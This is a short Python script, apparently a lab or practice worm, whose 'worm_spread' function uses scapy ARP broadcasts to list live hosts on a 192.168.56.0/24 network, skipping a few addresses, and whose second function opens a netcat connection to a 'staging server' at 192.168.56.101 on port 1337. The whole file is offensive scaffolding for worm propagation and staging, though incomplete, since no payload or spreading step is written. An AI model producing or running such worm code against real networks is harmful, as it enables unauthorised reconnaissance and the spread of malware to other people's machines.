#!/usr/bin/env python3
import sys
import subprocess

from scapy.all import ARP, Ether, srp

def worm_spread():
    target_ip = "192.168.56.0/24"

    # create ARP packet
    arp = ARP(pdst=target_ip)

    # create the Ether broadcast packet
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")

    # stack them
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]

    # a list of clients, to be filled in the upcoming loop
    clients = []
    for sent,received in result:
        clients.append(received.psrc)
    try:
        clients.remove('192.168.56.1') 
        clients.remove('192.168.56.100')
        clients.remove('192.168.56.101')
    except:
        pass
    return clients
print(worm_spread())

def nc_listener():
    #sending to staging server via netcat
    subprocess.run(["nc", "192.168.56.101", "1337"])
print(nc_listener())
